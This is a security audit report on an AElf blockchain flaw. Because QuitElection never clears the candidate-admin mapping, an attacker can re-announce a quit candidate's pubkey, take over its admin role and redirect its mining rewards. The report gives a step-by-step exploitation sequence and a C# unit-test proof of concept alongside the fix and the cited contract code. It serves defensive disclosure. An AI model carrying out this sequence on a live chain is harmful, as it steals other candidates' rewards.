# Audit Report

## Title
Admin Hijacking via AnnounceElectionFor Enables ProfitsReceiver Redirect After Candidate Quits

## Summary
The `QuitElection` method fails to clear the `CandidateAdmins` mapping, and `AnnounceElectionFor` lacks permission checks, allowing any attacker to hijack a quit candidate's admin role by re-announcing with an attacker-controlled admin address. This enables redirection of all future mining rewards and backup subsidies to the attacker through `SetProfitsReceiver`.

## Finding Description

**Root Cause Analysis:**

When a candidate quits election, the `QuitElection` method sets `IsCurrentCandidate = false` and removes entries from `ManagedCandidatePubkeysMap` and `CandidateSponsorMap`, but critically fails to clear the `CandidateAdmins` mapping. [1](#0-0) 

The `AnnounceElectionFor` method is a public RPC with no permission checks that allows anyone to announce election for any pubkey and set an arbitrary admin address. [2](#0-1) 

The internal `AnnounceElection` helper only validates that `!candidateInformation.IsCurrentCandidate`, which passes for quit candidates since their `IsCurrentCandidate` flag was set to false during quitting. [3](#0-2) 

After passing this check, line 128 in `AnnounceElectionFor` unconditionally overwrites the admin mapping with the attacker-controlled value: `State.CandidateAdmins[pubkey] = admin;` [4](#0-3) 

**Exploitation Sequence:**

1. Legitimate candidate Alice quits election via `QuitElection`, leaving `CandidateAdmins[Alice_pubkey]` unchanged
2. Attacker calls `AnnounceElectionFor(Alice_pubkey, Attacker_Admin)` 
3. The `!candidateInformation.IsCurrentCandidate` check passes since Alice quit
4. `CandidateAdmins[Alice_pubkey]` is overwritten with `Attacker_Admin`
5. Attacker calls `SetProfitsReceiver` in Treasury contract, which authorizes via `GetCandidateAdmin` from the Election contract [5](#0-4) 
6. `ProfitsReceiverMap[Alice_pubkey]` is set to attacker's address [6](#0-5) 

**Why Protections Fail:**

The `SetCandidateAdmin` recovery method requires the sender to be either Parliament or the current admin. After hijacking, the attacker IS the current admin, preventing the original owner from reclaiming control. [7](#0-6) 

**Reward Redirection:**

Mining rewards are distributed to beneficiaries determined by `GetProfitsReceiver(i.Pubkey)` which reads from the hijacked `ProfitsReceiverMap`. [8](#0-7) 

The `GetProfitsReceiver` implementation returns the value from `State.ProfitsReceiverMap[pubkey]`, which the attacker has redirected to their address. [9](#0-8) 

The `GetCandidateAdmin` view method simply returns the admin from the compromised mapping without additional validation. [10](#0-9) 

## Impact Explanation

**Direct Financial Loss:**
- All miner rewards (BasicRewardHash scheme) for the hijacked pubkey are redirected to the attacker
- All backup candidate subsidies (SubsidyHash scheme) are redirected to the attacker  
- If the hijacked pubkey later becomes a top miner, this represents substantial value theft over time proportional to mining performance

**Authorization Violation:**
- The candidate's admin role is permanently hijacked without their consent or knowledge
- Original candidate loses all control over their pubkey's profit receiver settings
- Recovery requires Parliament governance intervention, creating significant operational burden and delay

**Affected Parties:**
- Any candidate who quits election (common during term transitions, regulatory compliance, planned maintenance)
- Former miners who temporarily withdraw but may rejoin in future terms
- Backup candidates in data centers who cycle in/out based on election dynamics

This represents a critical breach of the protocol's economic security model, enabling direct theft of reward distributions through unauthorized admin takeover and profit receiver manipulation. The vulnerability violates the fundamental invariant that only the legitimate admin should control profit receiver settings.

## Likelihood Explanation

**Attacker Profile:**
- Requires only 100,000 tokens for `LockTokenForElection` (fully refundable by quitting later, making this essentially costless)
- No special privileges needed - `AnnounceElectionFor` is a public RPC accessible to any account
- Can monitor on-chain events to identify quit candidates in real-time

**Attack Complexity:**
- Two simple transactions: (1) `AnnounceElectionFor` with attacker's admin, (2) `SetProfitsReceiver` to attacker's address
- Fully deterministic with no race conditions or timing dependencies
- No requirement for front-running or complex transaction ordering

**Preconditions:**
- Target must have quit election (routine occurrence in validator operations)
- Attack window is indefinite - vulnerability persists until someone else re-announces or Parliament intervenes
- Multiple vulnerable targets likely exist at any given time as candidates join/leave

**Economic Incentive:**
- Cost: 100,000 tokens locked (fully recoverable by quitting later)
- Potential gain: Proportional share of Treasury distributions (BasicRewardHash + SubsidyHash)
- For candidates who become top miners, this could exceed millions in cumulative rewards over multiple terms
- Risk/reward ratio is extremely favorable

**Detection Difficulty:**
- No on-chain alerts or events for admin changes via re-announcement
- Victim may not notice until attempting to reclaim control or manually checking distributions
- Rewards accumulate silently to attacker's address over multiple distribution periods

The combination of zero net cost, high economic incentive, indefinite attack window, multiple targets, and low detection probability makes exploitation highly probable. Any rational attacker monitoring quit events would execute this attack.

## Recommendation

Clear the `CandidateAdmins` mapping when a candidate quits election. In the `QuitElection` method, add:

```csharp
State.CandidateAdmins.Remove(initialPubkey);
```

This should be added after line 277 in `ElectionContract_Candidate.cs`, alongside the removal of `CandidateSponsorMap`.

Additionally, consider adding a permission check to `AnnounceElectionFor` to prevent re-announcing for candidates who have previously set an admin, or require the previous admin's approval for re-announcement. Alternatively, implement a cooldown period after quitting before allowing re-announcement, during which only the previous admin can re-announce.

## Proof of Concept

```csharp
[Fact]
public async Task AdminHijacking_AfterQuit_Test()
{
    // Setup: Candidate announces with their admin
    var candidateKeyPair = ValidationDataCenterKeyPairs[0];
    var legitimateAdmin = GetElectionContractTester(candidateKeyPair);
    await legitimateAdmin.AnnounceElection.SendAsync(Address.FromPublicKey(candidateKeyPair.PublicKey));
    
    // Verify legitimate admin is set
    var adminBefore = await ElectionContractStub.GetCandidateAdmin.CallAsync(
        new StringValue { Value = candidateKeyPair.PublicKey.ToHex() });
    adminBefore.ShouldBe(Address.FromPublicKey(candidateKeyPair.PublicKey));
    
    // Candidate quits election
    await legitimateAdmin.QuitElection.SendAsync(new StringValue { Value = candidateKeyPair.PublicKey.ToHex() });
    
    // Attacker hijacks admin by re-announcing with their own admin
    var attackerKeyPair = ValidationDataCenterKeyPairs[1];
    var attackerStub = GetElectionContractTester(attackerKeyPair);
    var attackerAdmin = Address.FromPublicKey(attackerKeyPair.PublicKey);
    
    await attackerStub.AnnounceElectionFor.SendAsync(new AnnounceElectionForInput
    {
        Pubkey = candidateKeyPair.PublicKey.ToHex(),
        Admin = attackerAdmin
    });
    
    // Verify attacker now controls admin
    var adminAfter = await ElectionContractStub.GetCandidateAdmin.CallAsync(
        new StringValue { Value = candidateKeyPair.PublicKey.ToHex() });
    adminAfter.ShouldBe(attackerAdmin); // VULNERABILITY: Admin hijacked!
    
    // Attacker redirects profits to their address
    var attackerTreasuryStub = GetTreasuryContractTester(attackerKeyPair);
    await attackerTreasuryStub.SetProfitsReceiver.SendAsync(new SetProfitsReceiverInput
    {
        Pubkey = candidateKeyPair.PublicKey.ToHex(),
        ProfitsReceiverAddress = attackerAdmin
    });
    
    // Verify profits redirected
    var profitsReceiver = await TreasuryContractStub.GetProfitsReceiver.CallAsync(
        new StringValue { Value = candidateKeyPair.PublicKey.ToHex() });
    profitsReceiver.ShouldBe(attackerAdmin); // Profits now go to attacker!
}
```

This test demonstrates the complete attack: a candidate quits, an attacker re-announces with their own admin, and successfully redirects all future profits to themselves.

### Citations

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L19-57)
```csharp
    public override Empty SetCandidateAdmin(SetCandidateAdminInput input)
    {
        Assert(IsCurrentCandidateOrInitialMiner(input.Pubkey),
            "Pubkey is neither a current candidate nor an initial miner.");
        Assert(!IsPubkeyBanned(input.Pubkey), "Pubkey is already banned.");

        // Permission check
        var pubkey = State.InitialPubkeyMap[input.Pubkey] ?? input.Pubkey;
        if (Context.Sender != GetParliamentDefaultAddress())
        {
            if (State.CandidateAdmins[pubkey] == null)
            {
                // If admin is not set before (due to old contract code)
                Assert(Context.Sender == Address.FromPublicKey(ByteArrayHelper.HexStringToByteArray(input.Pubkey)),
                    "No permission.");
            }
            else
            {
                var oldCandidateAdmin = State.CandidateAdmins[pubkey];
                Assert(Context.Sender == oldCandidateAdmin, "No permission.");
            }
        }

        State.CandidateAdmins[pubkey] = input.Admin;

        var pubkeyByteString = ByteString.CopyFrom(ByteArrayHelper.HexStringToByteArray(pubkey));

        var newAdminManagedPubkeys = State.ManagedCandidatePubkeysMap[input.Admin] ?? new PubkeyList();
        if (!newAdminManagedPubkeys.Value.Contains(pubkeyByteString))
            newAdminManagedPubkeys.Value.Add(pubkeyByteString);
        State.ManagedCandidatePubkeysMap[input.Admin] = newAdminManagedPubkeys;

        var oldAdminManagedPubkeys = State.ManagedCandidatePubkeysMap[Context.Sender] ?? new PubkeyList();
        if (oldAdminManagedPubkeys.Value.Contains(pubkeyByteString))
            oldAdminManagedPubkeys.Value.Remove(pubkeyByteString);
        State.ManagedCandidatePubkeysMap[Context.Sender] = oldAdminManagedPubkeys;

        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L121-142)
```csharp
    public override Empty AnnounceElectionFor(AnnounceElectionForInput input)
    {
        var pubkey = input.Pubkey;
        var pubkeyBytes = ByteArrayHelper.HexStringToByteArray(pubkey);
        var address = Address.FromPublicKey(pubkeyBytes);
        AnnounceElection(pubkeyBytes);
        var admin = input.Admin ?? Context.Sender;
        State.CandidateAdmins[pubkey] = admin;
        var managedPubkeys = State.ManagedCandidatePubkeysMap[admin] ?? new PubkeyList();
        managedPubkeys.Value.Add(ByteString.CopyFrom(pubkeyBytes));
        State.ManagedCandidatePubkeysMap[admin] = managedPubkeys;
        LockCandidateNativeToken();
        AddCandidateAsOption(pubkey);
        if (State.Candidates.Value.Value.Count <= GetValidationDataCenterCount())
        {
            State.DataCentersRankingList.Value.DataCenters.Add(pubkey, 0);
            RegisterCandidateToSubsidyProfitScheme(pubkey);
        }

        State.CandidateSponsorMap[input.Pubkey] = Context.Sender;
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L144-175)
```csharp
    private void AnnounceElection(byte[] pubkeyBytes)
    {
        var pubkey = pubkeyBytes.ToHex();
        var pubkeyByteString = ByteString.CopyFrom(pubkeyBytes);

        Assert(!State.InitialMiners.Value.Value.Contains(pubkeyByteString),
            "Initial miner cannot announce election.");

        var candidateInformation = State.CandidateInformationMap[pubkey];

        if (candidateInformation != null)
        {
            Assert(!candidateInformation.IsCurrentCandidate,
                $"This public key already announced election. {pubkey}");
            candidateInformation.AnnouncementTransactionId = Context.OriginTransactionId;
            candidateInformation.IsCurrentCandidate = true;
            // In this way we can keep history of current candidate, like terms, missed time slots, etc.
            State.CandidateInformationMap[pubkey] = candidateInformation;
        }
        else
        {
            Assert(!IsPubkeyBanned(pubkey), "This candidate already banned before.");
            State.CandidateInformationMap[pubkey] = new CandidateInformation
            {
                Pubkey = pubkey,
                AnnouncementTransactionId = Context.OriginTransactionId,
                IsCurrentCandidate = true
            };
        }

        State.Candidates.Value.Value.Add(pubkeyByteString);
    }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L229-280)
```csharp
    public override Empty QuitElection(StringValue input)
    {
        var pubkeyBytes = ByteArrayHelper.HexStringToByteArray(input.Value);
        QuitElection(pubkeyBytes);
        var pubkey = input.Value;

        var initialPubkey = State.InitialPubkeyMap[pubkey] ?? pubkey;
        Assert(Context.Sender == State.CandidateAdmins[initialPubkey], "Only admin can quit election.");
        var candidateInformation = State.CandidateInformationMap[pubkey];

        // Unlock candidate's native token.
        var lockId = candidateInformation.AnnouncementTransactionId;
        var lockVirtualAddress = Context.ConvertVirtualAddressToContractAddress(lockId);
        State.TokenContract.TransferFrom.Send(new TransferFromInput
        {
            From = lockVirtualAddress,
            To = State.CandidateSponsorMap[input.Value] ?? Address.FromPublicKey(pubkeyBytes),
            Symbol = Context.Variables.NativeSymbol,
            Amount = ElectionContractConstants.LockTokenForElection,
            Memo = "Quit election."
        });

        // Update candidate information.
        candidateInformation.IsCurrentCandidate = false;
        candidateInformation.AnnouncementTransactionId = Hash.Empty;
        State.CandidateInformationMap[pubkey] = candidateInformation;

        // Remove candidate public key from the Voting Item options.
        State.VoteContract.RemoveOption.Send(new RemoveOptionInput
        {
            VotingItemId = State.MinerElectionVotingItemId.Value,
            Option = pubkey
        });
        var dataCenterList = State.DataCentersRankingList.Value;
        if (dataCenterList.DataCenters.ContainsKey(pubkey))
        {
            dataCenterList.DataCenters[pubkey] = 0;
            UpdateDataCenterAfterMemberVoteAmountChanged(dataCenterList, pubkey, true);
            State.DataCentersRankingList.Value = dataCenterList;
        }

        var managedCandidatePubkey = State.ManagedCandidatePubkeysMap[Context.Sender];
        managedCandidatePubkey.Value.Remove(ByteString.CopyFrom(pubkeyBytes));
        if (managedCandidatePubkey.Value.Any())
            State.ManagedCandidatePubkeysMap[Context.Sender] = managedCandidatePubkey;
        else
            State.ManagedCandidatePubkeysMap.Remove(Context.Sender);

        State.CandidateSponsorMap.Remove(pubkey);

        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Treasury/TreasuryContract.cs (L608-609)
```csharp
        var admin = State.ElectionContract.GetCandidateAdmin.Call(new StringValue {Value = input.Pubkey});
        Assert(Context.Sender == admin , "No permission.");
```

**File:** contract/AElf.Contracts.Treasury/TreasuryContract.cs (L620-620)
```csharp
        State.ProfitsReceiverMap[input.Pubkey] = input.ProfitsReceiverAddress;
```

**File:** contract/AElf.Contracts.Treasury/TreasuryContract.cs (L651-655)
```csharp
    private Address GetProfitsReceiver(string pubkey)
    {
        return State.ProfitsReceiverMap[pubkey] ??
               Address.FromPublicKey(ByteArrayHelper.HexStringToByteArray(pubkey));
    }
```

**File:** contract/AElf.Contracts.Treasury/TreasuryContract.cs (L816-816)
```csharp
                        Beneficiary = GetProfitsReceiver(i.Pubkey),
```

**File:** contract/AElf.Contracts.Election/ViewMethods.cs (L411-414)
```csharp
    public override Address GetCandidateAdmin(StringValue input)
    {
        return State.CandidateAdmins[State.InitialPubkeyMap[input.Value] ?? input.Value];
    }
```
